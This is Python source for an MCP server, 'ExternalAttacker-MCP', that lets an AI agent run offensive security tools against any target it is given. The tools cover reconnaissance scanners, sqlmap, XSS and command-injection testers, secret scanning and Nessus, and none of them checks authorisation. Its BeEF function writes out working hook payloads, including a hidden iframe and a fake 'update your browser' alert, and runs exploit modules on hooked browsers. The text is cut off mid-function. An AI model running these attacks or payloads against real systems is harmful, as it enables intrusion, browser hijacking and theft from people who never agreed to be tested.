from fastmcp import FastMCP
import subprocess
import requests
import os

# Import license manager
import sys

# Detect if running in MCP mode (suppress startup messages to avoid JSON parsing errors)
# When PORT is not set, we're running locally as MCP server using STDIO
# When PORT is set, we're running in cloud mode and can show messages
is_mcp_stdio_mode = os.environ.get('PORT') is None

try:
    from license_manager import LicenseManager
    license_manager = LicenseManager()
    
    # Check license at startup (only show messages when not in STDIO mode)
    if not is_mcp_stdio_mode:
        print("🔐 Checking ExternalAttacker-MCP License...", file=sys.stderr)
    
    license_status = license_manager.validate_license()
    
    if license_status['valid']:
        license_info = license_manager.get_license_info()
        if not is_mcp_stdio_mode:
            print(f"✅ License Valid - {license_info['license_type']} ({license_info['days_remaining']} days remaining)", file=sys.stderr)
            print(f"Licensed to: {license_info['customer_name']} ({license_info['customer_email']})", file=sys.stderr)
            
            # Warning for expiring licenses
            if license_info['days_remaining'] <= 7:
                print(f"⚠️ License expires in {license_info['days_remaining']} days!", file=sys.stderr)
    else:
        if not is_mcp_stdio_mode:
            print(f"❌ License Error: {license_status['error']}", file=sys.stderr)
            print("🔧 Activate trial license: python3 license_manager.py activate", file=sys.stderr)
            if license_status.get('action') != 'activate_trial':
                print("📞 Contact support for license renewal", file=sys.stderr)
            
            # Allow startup but functions will be limited
            print("⚠️ Starting in limited mode...", file=sys.stderr)
        license_manager = None
        
except ImportError:
    if not is_mcp_stdio_mode:
        print("⚠️ License manager not available - running without license validation", file=sys.stderr)
    license_manager = None

mcp = FastMCP("ExternalAttacker-MCP")

def run_command(command: list):
    """Run command via the Flask app's /api/run endpoint"""
    try:
        # Check license before running commands
        if license_manager:
            validation = license_manager.validate_license()
            if not validation['valid']:
                return {
                    'stdout': '',
                    'stderr': f'License Error: {validation["error"]}',
                    'returncode': 1
                }
            
            # Check feature access for compliance modules
            if 'compliance' in str(command) and not license_manager.check_feature_access('compliance_modules'):
                return {
                    'stdout': '',
                    'stderr': 'Compliance modules require a valid license',
                    'returncode': 1
                }
        
        tool = command[0]
        args = " ".join(command[1:])
        
        # Use environment variable for Flask app URL - defaults to localhost for local testing
        flask_url = os.environ.get('FLASK_APP_URL', 'http://127.0.0.1:6991')
        
        response = requests.post(
            f"{flask_url}/api/run",
            json={"tool": tool, "args": args},
            timeout=300
        )
        
        # Handle HTTP errors
        if response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'HTTP Error: {response.status_code}',
                'returncode': 1
            }
        
        # Parse JSON response
        result = response.json()
        
        # Ensure response has the expected structure
        if 'error' in result and 'stdout' not in result:
            return {
                'stdout': '',
                'stderr': result['error'],
                'returncode': 1
            }
            
        return result
    except requests.exceptions.RequestException as e:
        return {
            'stdout': '',
            'stderr': f'Request error: {str(e)}',
            'returncode': 1
        }
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'Error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def scan_subdomains(target: str, domain_file: bool, threads: int = 4):
    """
    Scan target domain(s) for subdomains using subfinder binary
    
    Args:
        target: Domain or file containing domains to scan
        domain_file: Whether target is a file containing domains
        threads: Number of concurrent threads to use
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "subfinder",
        "-list" if domain_file else "-domain", target,
        "-json",
        "-all", 
        "-silent",
        "-active",
        "-t", str(threads)
    ]
    return run_command(command)

@mcp.tool()
async def scan_subdomains_fast(target: str, threads: int = 4, sources: str = "crtsh,bufferover,rapiddns"):
    """
    Fast subdomain scanning using subfinder with limited sources for quick results
    
    Args:
        target: Domain to scan for subdomains
        threads: Number of concurrent threads to use (default: 50)
        sources: Comma-separated list of sources to use (default: crtsh,bufferover,rapiddns)
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "subfinder",
        "-domain", target,
        "-json",
        "-silent",
        "-active",
        "-t", str(threads),
        "-timeout", "15",
        "-sources", sources,
        "-max-time", "2"
    ]
    return run_command(command)

@mcp.tool()
async def scan_ports(target: str, file: bool, ports: str = "80,443", top_ports: bool = False, threads: int = 4):
    """
    Scan a target domain for open ports using naabu binary
    
    Args:
        target: Domain or IP to scan
        file: Whether to scan a file containing domains
        ports: Port range to scan (e.g. "80,443" or "1-1000") or number of top ports
        top_ports: Whether to scan top N ports or use port range
        threads: Number of concurrent threads (default: 20)
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "naabu",
        "-silent",
        "-nc", 
        "-c", str(threads),
        "-r", "8.8.8.8",
        "-skip-host-discovery",
        "-scan-all-ips",
        "-json"
    ]

    if file:
        command.extend(["-list", str(target)])
    else:
        command.extend(["-host", str(target)])

    if top_ports:
        command.extend(["-top-ports", str(ports)])
    else:
        command.extend(["-port", str(ports)])

    return run_command(command)

@mcp.tool()
async def analyze_http_services(target: str, file: bool, threads: int = 4):
    """
    Scan a target domain for HTTP/HTTPS services using httpx binary
    
    Args:
        target: Domain or file containing domains to scan
        file: Whether target is a file containing domains
        threads: Number of concurrent threads to use
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "httpx",
        "-silent",
        "-nc", 
        "-threads", str(threads),
        "-json",
        "-title",
        "-status-code",
        "-content-length",
        "-server",
        "-tech-detect"
    ]

    if file:
        command.extend(["-list", str(target)])
    else:
        command.extend(["-target", str(target)])

    return run_command(command)

@mcp.tool()
async def detect_cdn(target: str, resolver: str = "8.8.8.8"):
    """
    Check if a target domain is using a CDN using cdncheck binary
    
    Args:
        target: Domain to check for CDN usage
        resolver: DNS resolver to use
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "cdncheck",
        "-input", str(target),
        "-resolver", resolver,
        "-nc",
        "-duc",
        "-silent",
        "-resp",
        "-jsonl"
    ]

    return run_command(command)

@mcp.tool()
async def analyze_tls_config(target: str, file: bool, port: int = 443, resolver: str = "8.8.8.8", threads: int = 4):
    """
    Scan a target domain for TLS/SSL configuration using tlsx binary
    
    Args:
        target: Domain or file containing domains to scan
        file: Whether target is a file containing domains
        port: Port to scan for TLS
        resolver: DNS resolver to use
        threads: Number of concurrent threads to use
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "tlsx",
        "-silent",
        "-resolvers", str(resolver),
        "-nc",
        "-c", str(threads),
        "-p", str(port),
        "-json",
        "-so",
        "-tls-version",
        "-cipher",
        "-wildcard-cert",
        "-probe-status",
        "-version-enum",
        "-cipher-enum",
        "-cipher-type", "all",
        "-serial"
    ]
    if file:
        command.extend(["-l", str(target)])
    else:
        command.extend(["-u", str(target)])
    
    return run_command(command)

@mcp.tool()
async def enumerate_assets(mode: str, target: str = None, wordlist: str = None, threads: int = 4, 
                  extensions: str = None, status_codes: str = None, output: str = None,
                  resolver: str = None, append_domain: bool = True, methods: str = None,
                  project: str = None, region: str = None, server: str = None):
    """
    Unified asset enumeration using gobuster binary
    
    Args:
        mode: Gobuster mode (dir/dns/vhost/fuzz/gcs/s3/tftp)
        target: Target URL/domain/server (required for dir/dns/vhost/fuzz/tftp)
        wordlist: Path to wordlist
        threads: Number of concurrent threads
        extensions: File extensions for dir mode
        status_codes: Status codes for dir mode
        output: Output file path
        resolver: DNS resolver for dns mode
        append_domain: Append domain in vhost mode
        methods: HTTP methods for fuzz mode
        project: Project ID for gcs mode
        region: AWS region for s3 mode
        server: Server address for tftp mode
    """
    if not wordlist:
        raise ValueError("wordlist is required")
        
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = ["gobuster", mode, "-t", str(threads), "-q"]
    
    # Add mode-specific arguments
    if mode == "dir":
        if not target:
            raise ValueError("target is required for dir mode")
        command.extend(["-u", target+"/FUZZ", "-w", wordlist])
        if extensions:
            command.extend(["-x", extensions])
        if status_codes:
            command.extend(["-s", status_codes])
            
    elif mode == "dns":
        if not target:
            raise ValueError("target is required for dns mode")
        command.extend(["-d", target, "-w", wordlist])
        if resolver:
            command.extend(["-r", resolver])
            
    elif mode == "vhost":
        if not target:
            raise ValueError("target is required for vhost mode")
        command.extend(["-u", target, "-w", wordlist])
        if not append_domain:
            command.append("--append-domain=false")
            
    elif mode == "fuzz":
        if not target:
            raise ValueError("target is required for fuzz mode")
        command.extend(["-u", target, "-w", wordlist])
        if methods:
            command.extend(["-m", methods])
            
    elif mode == "gcs":
        command.extend(["-w", wordlist])
        if project:
            command.extend(["--project", project])
            
    elif mode == "s3":
        command.extend(["-w", wordlist])
        if region:
            command.extend(["--region", region])
            
    elif mode == "tftp":
        if not server:
            raise ValueError("server is required for tftp mode")
        command.extend(["-w", wordlist, "--server", server])
    
    if output:
        command.extend(["-o", output])
        
    return run_command(command)

@mcp.tool()
async def fuzz_endpoints(target: str, threads: int = 4,
                         wordlist: str = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/directory-list-2.3-medium.txt"):
    """
    Fuzz a target domain for hidden endpoints using ffuf binary
    
    Args:
        target: Target domain to fuzz
        threads: Number of concurrent threads to use
        wordlist: Path to wordlist to use
    """
    if "://" in wordlist:
        import tempfile
        r = requests.get(wordlist)
        # Use system temp directory instead of current working directory
        temp_dir = tempfile.gettempdir()
        filename = wordlist.split("/")[-1]
        path = os.path.join(temp_dir, filename)
        with open(path, "w") as f:
            f.write(r.text)
        wordlist = path
    else:
        if not os.path.exists(wordlist):
            raise FileNotFoundError(f"File {wordlist} not found")
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "ffuf",
        "-s",
        "-w", wordlist,
        "-u", target+"/FUZZ",
        "-t", str(threads)
    ]
    return run_command(command)

@mcp.tool()
async def resolve_dns(target: str, file: bool, threads: int = 4, resolver: str = "8.8.8.8",
                    wordlist: str = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt"):
    """
    Run DNS enumeration using dnsx binary
    
    Args:
        target: Domain or file containing domains to scan
        file: Whether target is a file containing domains
        threads: Number of concurrent threads to use
        resolver: DNS resolver to use
        wordlist: Path to wordlist for subdomain enumeration
    """
    if "://" in wordlist:
        import tempfile
        temp_dir = tempfile.gettempdir()
        filename = wordlist.split("/")[-1]
        path = os.path.join(temp_dir, filename)
        
        # Check if wordlist already exists to avoid re-downloading
        if not os.path.exists(path):
            try:
                r = requests.get(wordlist, timeout=30)
                r.raise_for_status()
                with open(path, "w") as f:
                    f.write(r.text)
            except requests.RequestException as e:
                return {
                    'stdout': '',
                    'stderr': f'Failed to download wordlist: {str(e)}',
                    'returncode': 1
                }
        wordlist = path
    else:
        if not os.path.exists(wordlist):
            raise FileNotFoundError(f"File {wordlist} not found")
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "dnsx",
        "-silent",
        "-t", str(threads),
        "-json",
        "-r", str(resolver),
        "-all",
        "-timeout", "10"
    ]
    if file:
        command.extend(["-l", str(target)])
    else:
        command.extend(["-d", str(target)])
    
    return run_command(command)

@mcp.tool()
async def crawl_website(target: str, depth: int = 3, field_scope: str = "rdn", 
                       threads: int = 4, timeout: int = 10, js_crawl: bool = False,
                       include_subs: bool = True, output_mode: str = "json"):
    """
    Web crawling and endpoint discovery using katana binary
    
    Args:
        target: Target URL to crawl
        depth: Crawling depth
        field_scope: Crawling scope (rdn/fqdn/ip)
        threads: Number of concurrent threads
        timeout: Request timeout in seconds  
        js_crawl: Enable JavaScript crawling
        include_subs: Include subdomains in crawling
        output_mode: Output format (json/plain)
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "katana",
        "-u", target,
        "-d", str(depth),
        "-fs", field_scope,
        "-c", str(threads),
        "-timeout", str(timeout),
        "-silent",
        "-nc"
    ]
    
    if js_crawl:
        command.append("-jc")
    if include_subs:
        command.append("-cs")
    if output_mode == "json":
        command.append("-jsonl")
        
    return run_command(command)

@mcp.tool()
async def scan_vulnerabilities(target: str, file: bool, templates: str = None, 
                             severity: str = None, tags: str = None, threads: int = 4,
                             timeout: int = 5, retries: int = 1, rate_limit: int = 150,
                             exclude_tags: str = None, include_tags: str = None):
    """
    Vulnerability scanning using nuclei binary
    
    Args:
        target: Target URL/domain or file containing targets
        file: Whether target is a file containing URLs
        templates: Specific template or template directory to use
        severity: Filter by severity (info,low,medium,high,critical)
        tags: Filter by tags (e.g. "sqli,xss")
        threads: Number of concurrent threads
        timeout: Request timeout in seconds
        retries: Number of retries for failed requests
        rate_limit: Maximum requests per second
        exclude_tags: Tags to exclude from scan
        include_tags: Tags to include in scan
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "nuclei",
        "-silent",
        "-nc",
        "-j",
        "-c", str(threads),
        "-timeout", str(timeout),
        "-retries", str(retries),
        "-rl", str(rate_limit)
    ]
    
    if file:
        command.extend(["-l", target])
    else:
        command.extend(["-u", target])
        
    if templates:
        command.extend(["-t", templates])
    if severity:
        command.extend(["-s", severity])
    if tags:
        command.extend(["-tags", tags])
    if exclude_tags:
        command.extend(["-etags", exclude_tags])
    if include_tags:
        command.extend(["-itags", include_tags])
        
    return run_command(command)

@mcp.tool()
async def test_sql_injection(target: str, data: str = None, method: str = "GET",
                            cookie: str = None, headers: str = None, level: int = 1,
                            risk: int = 1, threads: int = 1, timeout: int = 30,
                            tamper: str = None, technique: str = None):
    """
    SQL injection testing using sqlmap binary
    
    Args:
        target: Target URL to test
        data: POST data to test
        method: HTTP method (GET/POST)
        cookie: Cookie values
        headers: Additional headers
        level: Level of tests (1-5)
        risk: Risk of tests (1-3)
        threads: Number of threads
        timeout: Request timeout
        tamper: Tamper script to use
        technique: SQL injection technique (B,E,U,S,T,Q)
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "sqlmap",
        "-u", target,
        "--batch",
        "--random-agent",
        "--level", str(level),
        "--risk", str(risk),
        "--threads", str(threads),
        "--timeout", str(timeout),
        "--output-dir", "/tmp/sqlmap_output"
    ]
    
    if data:
        command.extend(["--data", data])
    if method.upper() == "POST":
        command.append("--method=POST")
    if cookie:
        command.extend(["--cookie", cookie])
    if headers:
        command.extend(["--headers", headers])
    if tamper:
        command.extend(["--tamper", tamper])
    if technique:
        command.extend(["--technique", technique])
        
    return run_command(command)

@mcp.tool()
async def scan_xss(target: str, file: bool, payloads: str = None, 
                  threads: int = 4, timeout: int = 10, delay: int = 0,
                  cookie: str = None, headers: str = None, user_agent: str = None,
                  mining_dom: bool = True, mining_dict: bool = True, skip_bav: bool = True):
    """
    XSS vulnerability scanning using dalfox binary
    
    Args:
        target: Target URL or file containing URLs
        file: Whether target is a file containing URLs
        payloads: Custom payload file path
        threads: Number of concurrent workers
        timeout: Request timeout in seconds
        delay: Delay between requests in milliseconds
        cookie: Cookie values
        headers: Additional headers
        user_agent: Custom User-Agent
        mining_dom: Enable DOM mining
        mining_dict: Enable dictionary mining  
        skip_bav: Skip Basic Another Vulnerability analysis
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "dalfox",
        "url" if not file else "file",
        target,
        "-o", "json",
        "-w", str(threads),
        "--timeout", str(timeout),
        "--delay", str(delay),
        "--silence"
    ]
    
    if payloads:
        command.extend(["-P", payloads])
    if cookie:
        command.extend(["-C", cookie])
    if headers:
        command.extend(["-H", headers])
    if user_agent:
        command.extend(["-U", user_agent])
    if mining_dom:
        command.append("--mining-dom")
    if mining_dict:
        command.append("--mining-dict")
    if skip_bav:
        command.append("--skip-bav")
        
    return run_command(command)

@mcp.tool()
async def enumerate_apis(target: str, wordlist: str = None, threads: int = 4,
                        delay: int = 0, timeout: int = 3, user_agent: str = None,
                        headers: str = None, methods: str = "GET,POST",
                        status_codes: str = None, max_length: int = None):
    """
    API endpoint enumeration using kiterunner binary
    
    Args:
        target: Target URL to scan
        wordlist: Path to wordlist file
        threads: Number of concurrent threads
        delay: Delay between requests in milliseconds
        timeout: Request timeout in seconds
        user_agent: Custom User-Agent string
        headers: Additional headers (format: "key:value,key2:value2")
        methods: HTTP methods to test
        status_codes: Status codes to show
        max_length: Maximum response length to show
    """
    if not wordlist:
        # Use default API wordlist
        wordlist = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints.txt"
        
    if "://" in wordlist:
        import tempfile
        r = requests.get(wordlist)
        # Use system temp directory instead of current working directory
        temp_dir = tempfile.gettempdir()
        filename = wordlist.split("/")[-1]
        path = os.path.join(temp_dir, filename)
        with open(path, "w") as f:
            f.write(r.text)
        wordlist = path
    else:
        if not os.path.exists(wordlist):
            raise FileNotFoundError(f"File {wordlist} not found")
            
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "kiterunner", "scan",
        target,
        "-w", wordlist,
        "-t", str(threads),
        "--delay", str(delay),
        "--timeout", str(timeout),
        "-o", "json"
    ]
    
    if user_agent:
        command.extend(["--user-agent", user_agent])
    if headers:
        command.extend(["--headers", headers])
    if methods:
        command.extend(["--methods", methods])
    if status_codes:
        command.extend(["--status-codes", status_codes])
    if max_length:
        command.extend(["--max-length", str(max_length)])
        
    return run_command(command)

@mcp.tool()
async def scan_with_zap(target: str, spider: bool = True, ajax_spider: bool = False,
                       active_scan: bool = True, passive_scan: bool = True,
                       auth_user: str = None, auth_pass: str = None,
                       session_script: str = None, context_file: str = None,
                       exclude_urls: str = None, include_urls: str = None):
    """
    Web application security scanning using OWASP ZAP
    
    Args:
        target: Target URL to scan
        spider: Enable traditional spider
        ajax_spider: Enable AJAX spider
        active_scan: Enable active vulnerability scanning
        passive_scan: Enable passive scanning
        auth_user: Authentication username
        auth_pass: Authentication password
        session_script: Session management script
        context_file: ZAP context file
        exclude_urls: URLs to exclude from scan
        include_urls: URLs to include in scan
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "zap-baseline.py" if not active_scan else "zap-full-scan.py",
        "-t", target,
        "-J", "/tmp/zap_report.json",
        "-r", "/tmp/zap_report.html"
    ]
    
    if not spider:
        command.append("-n")
    if ajax_spider:
        command.append("-j")
    if auth_user and auth_pass:
        command.extend(["-U", auth_user, "-P", auth_pass])
    if session_script:
        command.extend(["-s", session_script])
    if context_file:
        command.extend(["-c", context_file])
    if exclude_urls:
        command.extend(["-e", exclude_urls])
    if include_urls:
        command.extend(["-i", include_urls])
        
    return run_command(command)

@mcp.tool()
async def scan_secrets(target: str, scan_type: str = "filesystem", 
                      github_token: str = None, gitlab_token: str = None,
                      include_paths: str = None, exclude_paths: str = None,
                      max_depth: int = 50, threads: int = 4, 
                      output_format: str = "json", rules: str = None):
    """
    Secret scanning using trufflehog binary
    
    Args:
        target: Target to scan (path/URL/repo)
        scan_type: Type of scan (filesystem/git/github/gitlab/s3/docker)
        github_token: GitHub personal access token
        gitlab_token: GitLab access token
        include_paths: Paths to include in scan
        exclude_paths: Paths to exclude from scan
        max_depth: Maximum scan depth
        threads: Number of concurrent workers
        output_format: Output format (json/compact)
        rules: Custom rules file path
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = ["trufflehog"]
    
    if scan_type == "filesystem":
        command.extend(["filesystem", target])
    elif scan_type == "git":
        command.extend(["git", target])
    elif scan_type == "github":
        command.extend(["github", "--org=" + target if "/" not in target else "--repo=" + target])
        if github_token:
            command.extend(["--token", github_token])
    elif scan_type == "gitlab":
        command.extend(["gitlab", "--endpoint", target])
        if gitlab_token:
            command.extend(["--token", gitlab_token])
    elif scan_type == "s3":
        command.extend(["s3", "--bucket", target])
    elif scan_type == "docker":
        command.extend(["docker", "--image", target])
    
    command.extend([
        "--json" if output_format == "json" else "--no-verification",
        "-j", str(threads)
    ])
    
    if include_paths:
        command.extend(["--include-paths", include_paths])
    if exclude_paths:
        command.extend(["--exclude-paths", exclude_paths])
    if max_depth:
        command.extend(["--max-depth", str(max_depth)])
    if rules:
        command.extend(["--rules", rules])
        
    return run_command(command)

@mcp.tool()
async def scan_with_nessus(target: str, scan_template: str = "basic", 
                          nessus_url: str = "https://localhost:8834", 
                          access_key: str = None, secret_key: str = None,
                          scanner_id: int = 1, folder_id: int = 2):
    """
    Professional vulnerability scanning using Nessus
    
    Args:
        target: Target IP address, hostname, or CIDR range
        scan_template: Scan template (basic/advanced/discovery/compliance/malware)
        nessus_url: Nessus server URL
        access_key: Nessus API access key
        secret_key: Nessus API secret key
        scanner_id: Scanner ID to use
        folder_id: Folder ID for organizing scans
    """
    try:
        import json
        import uuid
        import time
        
        if not access_key or not secret_key:
            return {
                'stdout': '',
                'stderr': 'Nessus API credentials required (access_key and secret_key)',
                'returncode': 1
            }
        
        headers = {
            'X-ApiKeys': f'accessKey={access_key}; secretKey={secret_key}',
            'Content-Type': 'application/json'
        }
        
        # Get available scan templates
        templates_url = f"{nessus_url}/scans/templates"
        templates_response = requests.get(templates_url, headers=headers, verify=False)
        
        if templates_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'Failed to get Nessus templates: {templates_response.text}',
                'returncode': 1
            }
        
        templates = templates_response.json()
        template_uuid = None
        
        # Find the requested template
        for template in templates.get('templates', []):
            if scan_template.lower() in template.get('name', '').lower():
                template_uuid = template.get('uuid')
                break
        
        if not template_uuid:
            # Use basic network scan as default
            for template in templates.get('templates', []):
                if 'basic' in template.get('name', '').lower():
                    template_uuid = template.get('uuid')
                    break
        
        if not template_uuid:
            return {
                'stdout': '',
                'stderr': 'No suitable scan template found',
                'returncode': 1
            }
        
        # Create scan
        scan_name = f"ExternalAttacker-MCP-{int(time.time())}"
        scan_data = {
            "uuid": template_uuid,
            "settings": {
                "name": scan_name,
                "description": f"Automated scan of {target}",
                "folder_id": folder_id,
                "scanner_id": scanner_id,
                "text_targets": target
            }
        }
        
        create_url = f"{nessus_url}/scans"
        create_response = requests.post(create_url, headers=headers, json=scan_data, verify=False)
        
        if create_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'Failed to create Nessus scan: {create_response.text}',
                'returncode': 1
            }
        
        scan_info = create_response.json()
        scan_id = scan_info.get('scan', {}).get('id')
        
        # Launch scan
        launch_url = f"{nessus_url}/scans/{scan_id}/launch"
        launch_response = requests.post(launch_url, headers=headers, verify=False)
        
        if launch_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'Failed to launch Nessus scan: {launch_response.text}',
                'returncode': 1
            }
        
        result = {
            'scan_id': scan_id,
            'scan_name': scan_name,
            'target': target,
            'template': scan_template,
            'status': 'launched',
            'message': f'Nessus scan {scan_id} launched successfully for target {target}'
        }
        
        return {
            'stdout': json.dumps(result),
            'stderr': '',
            'returncode': 0
        }
        
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'Nessus scan error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def exploit_with_beef(target_url: str, beef_server: str = "http://localhost:3000",
                           beef_user: str = "beef", beef_pass: str = "beef",
                           hook_method: str = "iframe", payload_modules: str = None):
    """
    Browser exploitation using BeEF (Browser Exploitation Framework)
    
    Args:
        target_url: Target website URL to inject BeEF hook
        beef_server: BeEF server URL
        beef_user: BeEF admin username
        beef_pass: BeEF admin password
        hook_method: Method to inject hook (iframe/redirect/social)
        payload_modules: Comma-separated list of BeEF modules to execute
    """
    try:
        import json
        import base64
        
        # Authenticate with BeEF
        auth_data = {
            'username': beef_user,
            'password': beef_pass
        }
        
        auth_url = f"{beef_server}/api/admin/login"
        auth_response = requests.post(auth_url, json=auth_data)
        
        if auth_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'BeEF authentication failed: {auth_response.text}',
                'returncode': 1
            }
        
        auth_result = auth_response.json()
        beef_token = auth_result.get('token')
        
        if not beef_token:
            return {
                'stdout': '',
                'stderr': 'Failed to get BeEF authentication token',
                'returncode': 1
            }
        
        headers = {'Authorization': f'Bearer {beef_token}'}
        
        # Get BeEF hook URL
        hook_url = f"{beef_server}/hook.js"
        
        # Generate hook injection based on method
        if hook_method == "iframe":
            injection_code = f'<iframe src="{beef_server}" style="display:none;"></iframe><script src="{hook_url}"></script>'
        elif hook_method == "redirect":
            injection_code = f'<script>window.location.href="{beef_server}";setTimeout(function(){{window.location.href="{target_url}";}},1000);</script><script src="{hook_url}"></script>'
        elif hook_method == "social":
            injection_code = f'<script>alert("Please update your browser for security!");window.open("{beef_server}");</script><script src="{hook_url}"></script>'
        else:
            injection_code = f'<script src="{hook_url}"></script>'
        
        # Get hooked browsers
        hooks_url = f"{beef_server}/api/hooks"
        hooks_response = requests.get(hooks_url, headers=headers)
        
        result = {
            'beef_server': beef_server,
            'hook_url': hook_url,
            'injection_code': injection_code,
            'target_url': target_url,
            'hook_method': hook_method,
            'status': 'ready'
        }
        
        if hooks_response.status_code == 200:
            hooks_data = hooks_response.json()
            result['hooked_browsers'] = hooks_data.get('hooked-browsers', {})
            result['online_browsers'] = len([b for b in result['hooked_browsers'] if result['hooked_browsers'][b].get('online')])
        
        # Execute payload modules if specified
        if payload_modules and result.get('hooked_browsers'):
            executed_modules = []
            modules_list = payload_modules.split(',')
            
            for browser_id in result['hooked_browsers']:
                for module in modules_list:
                    module = module.strip()
                    module_url = f"{beef_server}/api/modules/{browser_id}/{module}"
                    module_response = requests.post(module_url, headers=headers, json={})
                    
                    if module_response.status_code == 200:
                        executed_modules.append({
                            'browser': browser_id,
                            'module': module,
                            'status': 'executed'
                        })
            
            result['executed_modules'] = executed_modules
        
        return {
            'stdout': json.dumps(result),
            'stderr': '',
            'returncode': 0
        }
        
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'BeEF exploitation error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def test_command_injection(target: str, cookie: str = None, headers: str = None,
                                data: str = None, method: str = "GET", level: int = 1,
                                technique: str = "classic", threads: int = 1,
                                timeout: int = 30, tamper: str = None):
    """
    Command injection testing using Commix
    
    Args:
        target: Target URL to test for command injection
        cookie: Cookie values for authentication
        headers: Additional HTTP headers
        data: POST data for testing
        method: HTTP method (GET/POST)
        level: Level of tests (1-3)
        technique: Injection technique (classic/eval-based/time-based/file-based)
        threads: Number of threads
        timeout: Request timeout
        tamper: Tamper script for evasion
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "commix",
        "--url", target,
        "--batch",
        "--random-agent",
        "--level", str(level),
        "--timeout", str(timeout),
        "--technique", technique
    ]
    
    if cookie:
        command.extend(["--cookie", cookie])
    if headers:
        command.extend(["--headers", headers])
    if data and method.upper() == "POST":
        command.extend(["--data", data])
    if tamper:
        command.extend(["--tamper", tamper])
    if threads > 1:
        command.extend(["--threads", str(threads)])
    
    # Add output options
    command.extend([
        "--output-dir", "/tmp/commix_output",
        "--verbose"
    ])
    
    return run_command(command)

@mcp.tool()
async def get_nessus_results(scan_id: int, nessus_url: str = "https://localhost:8834",
                            access_key: str = None, secret_key: str = None,
                            export_format: str = "nessus"):
    """
    Retrieve and export Nessus scan results
    
    Args:
        scan_id: Nessus scan ID to retrieve results for
        nessus_url: Nessus server URL
        access_key: Nessus API access key
        secret_key: Nessus API secret key
        export_format: Export format (nessus/pdf/html/csv)
    """
    try:
        import json
        import time
        
        if not access_key or not secret_key:
            return {
                'stdout': '',
                'stderr': 'Nessus API credentials required',
                'returncode': 1
            }
        
        headers = {
            'X-ApiKeys': f'accessKey={access_key}; secretKey={secret_key}',
            'Content-Type': 'application/json'
        }
        
        # Check scan status
        status_url = f"{nessus_url}/scans/{scan_id}"
        status_response = requests.get(status_url, headers=headers, verify=False)
        
        if status_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'Failed to get scan status: {status_response.text}',
                'returncode': 1
            }
        
        scan_data = status_response.json()
        scan_status = scan_data.get('info', {}).get('status')
        
        if scan_status != 'completed':
            return {
                'stdout': json.dumps({
                    'scan_id': scan_id,
                    'status': scan_status,
                    'message': f'Scan is still {scan_status}. Please wait for completion.'
                }),
                'stderr': '',
                'returncode': 0
            }
        
        # Export scan results
        export_data = {
            "format": export_format
        }
        
        export_url = f"{nessus_url}/scans/{scan_id}/export"
        export_response = requests.post(export_url, headers=headers, json=export_data, verify=False)
        
        if export_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'Failed to export scan: {export_response.text}',
                'returncode': 1
            }
        
        export_info = export_response.json()
        file_id = export_info.get('file')
        
        # Wait for export to complete and download
        download_url = f"{nessus_url}/scans/{scan_id}/export/{file_id}/download"
        
        # Poll for export completion
        for _ in range(30):  # Wait up to 5 minutes
            try:
                download_response = requests.get(download_url, headers=headers, verify=False)
                if download_response.status_code == 200:
                    # Save results to temp file
                    import tempfile
                    temp_dir = tempfile.gettempdir()
